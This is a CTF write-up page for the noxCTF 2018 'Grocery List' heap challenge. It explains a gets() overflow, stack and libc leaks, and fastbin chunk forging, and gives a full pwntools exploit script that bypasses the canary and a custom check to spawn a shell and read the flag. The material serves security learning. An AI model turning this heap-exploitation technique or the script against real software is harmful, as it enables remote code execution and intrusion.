<!doctype html>

<html lang="en-us">

<head>
  <title>Catousify</title>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description" content="The HTML5 Herald" />
  <meta name="author" content="kiror0" /><meta name="generator" content="Hugo 0.62.0" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.0/normalize.min.css" />
  <script src="https://kit.fontawesome.com/b76b73e8e8.js" crossorigin="anonymous"></script>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab|Ruda" />
  <link rel="stylesheet" type="text/css" href="http://zeroload.github.io/ctf/css/styles.css" /></head>

<body>
  <div id="container">
    <header>
      <h1>
                <a href="http://zeroload.github.io/ctf/">Catousify</a>
            </h1>

      <ul id="social-media">
        
        
          
        <li><a href="https://github.com/kiror0"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a></li>
           
      </ul>
      
      <p><em>No Clever Tagline Needed.</em></p>
      
    </header>

    
<nav>
    <ul>
        
        <li>
            <a class="" href="http://zeroload.github.io/ctf/posts/">
                <i class="fa-li fa  fa-lg"></i><span>Posts</span>
            </a>
        </li>
        
        <li>
            <a class="" href="http://zeroload.github.io/ctf/about/">
                <i class="fa-li fa  fa-lg"></i><span>About Me</span>
            </a>
        </li>
        
    </ul>
</nav>

    <main>




<article>

    <h1>noxCTF 2018 - Grocery List</h1>

    
        <aside>
    <ul>
        <li>
            <time class="post-date" datetime="2018-09-09T15:31:34Z">Sep 9, 2018</time>
        </li>
        
        <li>
            Categories:
            <em>
                
                    
                    <a href="http://zeroload.github.io/ctf/categories/pwn">pwn</a>
                
                    , 
                    <a href="http://zeroload.github.io/ctf/categories/writeup">writeup</a>
                
            </em>
        </li>
        

        

        <li>6 minutes read</li>
    </ul>
</aside>

    

    <blockquote>
<p>Downloads:</p>
<p><a href="http://zeroload.github.io/ctf/assets/noxCTF/grocery_list/GroceryList">GroceryList</a></p>
<p><a href="http://zeroload.github.io/ctf/assets/noxCTF/grocery_list/solve.py">solve.py</a></p>
</blockquote>
<h2 id="intro">intro</h2>
<pre><code>λ › checksec ./GroceryList
[*] '/Challs/noxCTF/pwn/grocery_list/GroceryList'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
λ › ./GroceryList
Hello and welcome to the grocery List! Here you can manage the list of items you would like to buy.
What would you like to do?
1. Print the list
2. Add item to the list
3. Add empty items to the list
4. Remove an item from the list
5. Edit an existing item
6. Add default example
7. Exit
3
What is the size of your items?
1. Small
2. Medium
3. Large
1
How many items would you like to add?
1
^C
</code></pre><pre><code>I really hate it when I forget what I wanted to buy.
That's why I created the FASTEST Grocery List in the world.
Go check it out.
nc chal.noxale.com 1232
</code></pre><p>This is like any usual heap exploitation challanges, we have <code>print</code>, <code>remove</code>, <code>edit</code>, and <code>add</code> items in/to the lists. The main loop roughly looks like this,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">  <span style="color:#66d9ef">int</span> select;
  <span style="color:#66d9ef">char</span> grocery_item[<span style="color:#ae81ff">12</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Grocery Item</span><span style="color:#e6db74">&#34;</span>;
  <span style="color:#66d9ef">do</span> {
    puts_(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">What would you like to do?</span><span style="color:#e6db74">&#34;</span>);
    puts_(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">1. Print the list</span><span style="color:#e6db74">&#34;</span>);
    puts_(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">2. Add item to the list</span><span style="color:#e6db74">&#34;</span>);
    puts_(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">3. Add empty items to the list</span><span style="color:#e6db74">&#34;</span>);
    puts_(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">4. Remove an item from the list</span><span style="color:#e6db74">&#34;</span>);
    puts_(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">5. Edit an existing item</span><span style="color:#e6db74">&#34;</span>);
    puts_(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">6. Add default example</span><span style="color:#e6db74">&#34;</span>);
    puts_(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">7. Exit</span><span style="color:#e6db74">&#34;</span>);
    fflush(stdin);
    scanf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">&amp;</span>select);
    <span style="color:#66d9ef">switch</span> ( select ) {
      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
        print_all();
        <span style="color:#66d9ef">break</span>;
      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>
        add_item();
        <span style="color:#66d9ef">break</span>;
      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>
        add_empty();
        <span style="color:#66d9ef">break</span>;
      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span>
        delete_item();
        <span style="color:#66d9ef">break</span>;
      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">:</span>
        edit_item();
        <span style="color:#66d9ef">break</span>;
      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">6</span><span style="color:#f92672">:</span>
        add_default(grocery_item);
        <span style="color:#66d9ef">break</span>;
      <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">7</span><span style="color:#f92672">:</span>
        puts_(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Goodbye</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
        free_all();
        <span style="color:#66d9ef">break</span>;
      <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
        puts_(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Invalid choice</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
        <span style="color:#66d9ef">break</span>;
    }
  } <span style="color:#66d9ef">while</span> ( select <span style="color:#f92672">!</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">7</span> );
</code></pre></div><p>Looks good, but we have some limitation on malloc chunk size, only FASTBIN allowed <code>small = 0x10</code>, <code>medium = 0x38</code>, and <code>large = 0x60</code>. This actually confirms the challange description <code>the FASTEST Grocery List in the world</code>, well, yes <em>FASTEST</em> bin.</p>
<h2 id="overflow">overflow</h2>
<p>In <code>edit</code> we have overflow using <code>gets()</code>,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">    puts_(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Which item would you like to edit?</span><span style="color:#e6db74">&#34;</span>);
    fflush(stdin);
    scanf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">&amp;</span>index);
    <span style="color:#66d9ef">if</span> ( index <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">|</span><span style="color:#f92672">|</span> count <span style="color:#f92672">&lt;</span><span style="color:#f92672">=</span> index ) {
      puts_(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Invalid index</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    } <span style="color:#66d9ef">else</span> {
      puts_(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Enter your item`s new name: </span><span style="color:#e6db74">&#34;</span>);
      gets(ptr_list[index]);
      item <span style="color:#f92672">=</span> ptr_list[v2];
      item[strcspn(ptr_list[index], <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    }
</code></pre></div><h2 id="leak">leak</h2>
<p>In <code>add_default</code>, the argument isn't passed properly, instead of copying it's value, it's actually copied the pointer to grocery_item on stack. Thus, we have stack leak.</p>
<pre><code>    add_default()
    stack = u64(dump_all()[0].ljust(8, '\x00'))
    log.info('stack ' + hex(stack))

gdb-peda$ x/10gx 0x555555554000+0x202040
0x555555756040: 0x0000555555758430      0x0000000000000000
0x555555756050: 0x0000000000000000      0x0000000000000000
0x555555756060: 0x0000000000000000      0x0000000000000000
0x555555756070: 0x0000000000000000      0x0000000000000000
gdb-peda$ x/10gx 0x0000555555758420
0x555555758420: 0x0000000000000000      0x0000000000000021
0x555555758430: 0x00007fffffffeceb      0x0000000000000000
0x555555758440: 0x0000000000000000      0x000000000001fbc1
0x555555758450: 0x0000000000000000      0x0000000000000000
0x555555758460: 0x0000000000000000      0x0000000000000000
</code></pre><h2 id="fastbin-attack-forging-chunk">fastbin-attack, forging-chunk</h2>
<p>In simple form, we will corrupt FD pointer to trick malloc serving us a controlled pointer. We have stack address leak, so it should be good destination for this.</p>
<pre><code>gdb-peda$ x/10gx 0x00007fffffffecd0
0x7fffffffecd0: 0x00000000ffffecfe      0x0000000000000021
0x7fffffffece0: 0x00002aaaaacf3830      0x65636f7247554910
0x7fffffffecf0: 0x006d657449207972      0x4226f8d697e7ba00
0x7fffffffed00: 0x0000555555555380      0x00002aaaaacf3830
0x7fffffffed10: 0x0000000000000001      0x00007fffffffede8
</code></pre><p>welp. Right off the bat, <code>0x7fffffffecd0</code> should be good enough, beacause the it passes the request size check for <code>__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)</code>.</p>
<pre><code>    add_empty(1, 4)
	remove_item(1)
	remove_item(1)

gdb-peda$ x/20gx 0x0000555555758420
0x555555758420: 0x0000000000000000      0x0000000000000021 &lt;- item 0
0x555555758430: 0x0000000000000000      0x0000000000000000
0x555555758440: 0x0000000000000000      0x0000000000000021 &lt;- item 1, already free
0x555555758450: 0x0000000000000000      0x0000000000000000
0x555555758460: 0x0000000000000000      0x0000000000000021 &lt;- item 2, free
0x555555758470: 0x0000555555758440      0x0000000000000000 # FD
0x555555758480: 0x0000000000000000      0x0000000000000021 &lt;- item 3
0x555555758490: 0x0000000000000000      0x0000000000000000
0x5555557584a0: 0x0000000000000000      0x000000000001fb61

    payload  = p64(0) * 3
    payload += p64(0x21)
    payload += p64(0) * 3
    payload += p64(0x21)
    payload += p64(stack - 0x1b)
    edit_item(0, payload)

gdb-peda$ x/20gx 0x0000555555758420
0x555555758420: 0x0000000000000000      0x0000000000000021 &lt;- item 0
0x555555758430: 0x0000000000000000      0x0000000000000000
0x555555758440: 0x0000000000000000      0x0000000000000021 &lt;- item 1, already free
0x555555758450: 0x0000000000000000      0x0000000000000000
0x555555758460: 0x0000000000000000      0x0000000000000021 &lt;- item 2, free
0x555555758470: 0x00007fffffffecd0      0x0000000000000000 # FD corrupted
0x555555758480: 0x0000000000000000      0x0000000000000021 &lt;- item 3
</code></pre><p>So, after this the next allocation for items should have our controlled pointer,</p>
<pre><code>    add_empty(1, 2)

gdb-peda$ x/10gx 0x555555554000+0x202040
0x555555756040: 0x0000555555758430      0x0000555555758490
0x555555756050: 0x0000555555758470      0x00007fffffffece0 &lt;- controlled !!
0x555555756060: 0x0000000000000000      0x0000000000000000
0x555555756070: 0x0000000000000000      0x0000000000000000
0x555555756080: 0x0000000000000000      0x0000000000000000
</code></pre><p>This will eventually lead to libc leak too, since <code>0x00007fffffffece0</code> contains the address of <code>__libc_start_main+241</code>. Ok, we have overflow, controlled pointer at stack, libc leak, is it done? Well, sadly, not yet. We should bypass some more protection on binary, stack canary and this custom protection at the end of <code>main</code> function.</p>
<pre><code>if ( *(rbp+0x8) != (void *)bss_retAddr || *(rbp-0x20) != (void *)bss_retAddr )
    exit(1);
</code></pre><p>We can't use overflow and <code>dump_all</code> to leak canary, because at the end of buffer null byte appended. So, from this point it's just forging chunks and fastbin attack with different size (we still have medium and large sized fastbins to use), to leak canary, pie base, and stuff.</p>
<p>Wonder why I'm not using <code>__malloc_hook</code> or stuff like that? Well, sadly, no satisfied offset from any one_gadget RCE, simply we can't use <code>__malloc_hook</code> on this challanges, or is it(?).</p>
<h2 id="full-exploit">full exploit</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">import</span> sys

gdbcmd <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">b *{}+0x1283</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;&#39;</span>

<span style="color:#75715e"># context.terminal = &#39;kitty @ new-window --keep-focus sh -c&#39;.split()</span>

<span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>argv<span style="color:#f92672">.</span>__len__() <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>:
    r <span style="color:#f92672">=</span> remote(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], int(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>]))
<span style="color:#66d9ef">else</span>:
    r <span style="color:#f92672">=</span> process(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], aslr<span style="color:#f92672">=</span>False, env<span style="color:#f92672">=</span>{<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">LD_PRELOAD</span><span style="color:#e6db74">&#39;</span> : <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/home/vagrant/ctf/nox/pwn/grocery_list/libc.so</span><span style="color:#e6db74">&#39;</span>})
    <span style="color:#75715e"># r = process(sys.argv[1], aslr=False)</span>
    gdb<span style="color:#f92672">.</span>attach(r, gdbcmd<span style="color:#f92672">.</span>format(<span style="color:#ae81ff">0x555555554000</span>))
    <span style="color:#75715e"># r = process(sys.argv[1])</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dump_all</span>():
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">7. Exit</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">1</span><span style="color:#e6db74">&#39;</span>)
    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">----------</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
    content <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">----------</span><span style="color:#e6db74">&#39;</span>, drop<span style="color:#f92672">=</span>True)
    content <span style="color:#f92672">=</span> content<span style="color:#f92672">.</span>splitlines()
    content <span style="color:#f92672">=</span> [x<span style="color:#f92672">.</span>split(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">. </span><span style="color:#e6db74">&#39;</span>)[<span style="color:#ae81ff">1</span>] <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> content]
    <span style="color:#66d9ef">return</span> content

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_item</span>(size, payload):
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">7. Exit</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">2</span><span style="color:#e6db74">&#39;</span>)
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">items?</span><span style="color:#e6db74">&#39;</span>, str(size))
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">name:</span><span style="color:#e6db74">&#39;</span>, payload)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_empty</span>(size, count):
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">7. Exit</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">3</span><span style="color:#e6db74">&#39;</span>)
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">items?</span><span style="color:#e6db74">&#39;</span>, str(size))
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">add?</span><span style="color:#e6db74">&#39;</span>, str(count))

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">remove_item</span>(ID):
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">7. Exit</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">4</span><span style="color:#e6db74">&#39;</span>)
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">remove?</span><span style="color:#e6db74">&#39;</span>, str(ID))

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit_item</span>(ID, payload):
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">7. Exit</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">5</span><span style="color:#e6db74">&#39;</span>)
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">edit?</span><span style="color:#e6db74">&#39;</span>, str(ID))
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">name:</span><span style="color:#e6db74">&#39;</span>, payload)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_default</span>():
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">7. Exit</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">6</span><span style="color:#e6db74">&#39;</span>)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_exit</span>():
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">7. Exit</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">7</span><span style="color:#e6db74">&#39;</span>)

add_default()
stack <span style="color:#f92672">=</span> u64(dump_all()[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">stack </span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> hex(stack))
remove_item(<span style="color:#ae81ff">0</span>)

add_empty(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">4</span>)
remove_item(<span style="color:#ae81ff">1</span>)
remove_item(<span style="color:#ae81ff">1</span>)
payload  <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span>
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x21</span>)
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span>
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x21</span>)
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(stack <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1b</span>)
edit_item(<span style="color:#ae81ff">0</span>, payload)
add_empty(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>)

libc <span style="color:#f92672">=</span> u64(dump_all()[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20830</span>
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">libc </span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> hex(libc))

remove_item(<span style="color:#ae81ff">0</span>)
remove_item(<span style="color:#ae81ff">0</span>)
remove_item(<span style="color:#ae81ff">0</span>)

payload  <span style="color:#f92672">=</span> p64(libc <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20830</span>)
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>)
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x4100</span>)
edit_item(<span style="color:#ae81ff">0</span>, payload)

add_empty(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">4</span>)
remove_item(<span style="color:#ae81ff">2</span>)
remove_item(<span style="color:#ae81ff">2</span>)
payload  <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">7</span>
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x41</span>)
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">7</span>
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x41</span>)
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(stack <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>)
edit_item(<span style="color:#ae81ff">1</span>, payload)
add_empty(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>)

remove_item(<span style="color:#ae81ff">1</span>)
remove_item(<span style="color:#ae81ff">1</span>)
remove_item(<span style="color:#ae81ff">1</span>)

canary <span style="color:#f92672">=</span> u64(dump_all()[<span style="color:#ae81ff">1</span>][:<span style="color:#ae81ff">7</span>]<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
pie <span style="color:#f92672">=</span> u64(dump_all()[<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">7</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1380</span>
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">canary </span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> hex(canary))
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">pie </span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> hex(pie))

add_empty(<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>)
remove_item(<span style="color:#ae81ff">3</span>)
remove_item(<span style="color:#ae81ff">3</span>)
payload  <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">13</span>
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x71</span>)
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">13</span>
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x71</span>)
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(pie <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20202d</span>)
edit_item(<span style="color:#ae81ff">2</span>, payload)
add_empty(<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">2</span>)

remove_item(<span style="color:#ae81ff">2</span>)
<span style="color:#75715e"># gdb.attach(r, gdbcmd.format(pie))</span>
remove_item(<span style="color:#ae81ff">2</span>)
remove_item(<span style="color:#ae81ff">2</span>)

payload  <span style="color:#f92672">=</span> p64(libc <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x45216</span>)
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(canary)
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(pie <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1380</span>)
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(libc <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x45216</span>)
edit_item(<span style="color:#ae81ff">0</span>, payload)

payload  <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span>
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(stack <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xb</span>)
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(stack <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span>)
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(pie <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20203d</span>)
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">18</span>
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(libc <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x45216</span>)
edit_item(<span style="color:#ae81ff">2</span>, payload)

_exit()
r<span style="color:#f92672">.</span>interactive()
</code></pre></div><h2 id="flag">flag</h2>
<pre><code>λ › python solve.py chal.noxale.com 1232
[+] Opening connection to chal.noxale.com on port 1232: Done
[*] stack 0x7ffec128fb3b
[*] libc 0x7fdf29bb9000
[*] canary 0xedc677284751c5
[*] pie 0x55a4c8cd3000
[*] Switching to interactive mode

Goodbye

$ ls
GroceryList
flag
$ cat flag
noxCTF{I_L0ve_F0rg1ng_Chunk5}
$ 
[*] Closed connection to chal.noxale.com port 1232
</code></pre>

</article>


<section class="post-nav">
    <ul>
        
        <li>
            <a href="http://zeroload.github.io/ctf/posts/hacktoday-2018-not-a-game/"><i class="fa fa-chevron-circle-left"></i> HackToday 2018 - not /a/game</a>
        </li>
        
        
        <li>
            <a href="http://zeroload.github.io/ctf/posts/cyber-jawara-2018-final-zeus/">Cyber Jawara 2018 Final - zeus <i class="fa fa-chevron-circle-right"></i> </a>
        </li>
        
    </ul>
</section>
    





</main>
    <footer>
        <h6>Copyright © 2019 - kiror0 |
            Rendered by <a href="https://gohugo.io" title="Hugo">Hugo</a> |
            <a href="http://zeroload.github.io/ctf/index.xml">Subscribe</a></h6>
    </footer>
</div>
<script src="http://zeroload.github.io/ctf/js/scripts.js"></script>


<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-146594173-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>


</body>

</html>
